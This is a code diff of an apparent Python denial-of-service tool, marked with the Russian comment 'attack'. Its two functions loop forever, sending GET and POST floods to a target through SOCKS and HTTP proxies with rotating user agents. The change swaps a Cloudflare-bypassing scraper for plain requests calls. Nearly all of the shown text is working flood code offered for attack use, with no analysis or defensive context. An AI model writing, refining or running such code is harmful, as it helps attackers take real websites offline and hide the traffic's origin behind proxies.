@@ -46,8 +46,6 @@ os.remove("proxysocks")
 # Аттака
 def dos1_1(target, proxy):
     while True:
-        s = cfscrape.create_scraper()
-
         useragent = random.choice(headersp)
         header = {'accept': '*/*', 'user-agent': useragent}
 
@@ -60,19 +58,17 @@ def dos1_1(target, proxy):
         }
 
         try:
-            s.get(target, headers=header, proxies=proxiessockshttp, timeout=1)
+            requests.get(target, headers=header, proxies=proxiessockshttp)
         except:
             pass
 
         try:
-            s.post(target, headers=header2, proxies=proxiessockshttp, timeout=1)
+            requests.post(target, headers=header2, proxies=proxiessockshttp)
         except:
             pass
 
 def dos1_2(target, proxy):
     while True:
-        s = cfscrape.create_scraper()
-
         useragent = random.choice(headersp)
         header = {'accept': '*/*', 'user-agent': useragent}
 
@@ -85,12 +81,12 @@ def dos1_2(target, proxy):
         }
 
         try:
-            s.get(target, headers=header, proxies=proxieshttphttp, timeout=1)
+            requests.get(target, headers=header, proxies=proxieshttphttp)
         except:
             pass
 
         try:
-            s.post(target, headers=header2, proxies=proxieshttphttp, timeout=1)
+            requests.post(target, headers=header2, proxies=proxieshttphttp)
         except:
             pass
 
